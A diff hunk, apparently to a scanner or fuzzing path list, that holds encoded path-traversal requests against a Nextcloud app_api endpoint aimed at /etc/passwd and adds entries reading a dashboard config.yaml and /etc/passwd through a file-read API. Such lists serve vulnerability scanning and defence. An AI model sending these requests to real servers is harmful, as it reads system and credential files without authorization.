@@ -75,3 +75,6 @@
 /index.php/apps/app_api/proxy/flow/api/w/_/jobs_u/get_log_file/..%25252F..%25252F..%25252F..%25252F..%25252F..%25252Fetc%25252Fpasswd
 /index.php/apps/app_api/proxy/flow/api/w/_/jobs_u/get_log_file/..%25252F..%25252F..%25252F..%25252Fetc%25252Fpasswd
 /api/v1/chatflows
+/dashboard%2e%2e/data/config.yaml
+/api/fs/read?allowOutsideWorkspace=true&path=/etc/passwd
+/api/v1/repos/search?limit=1
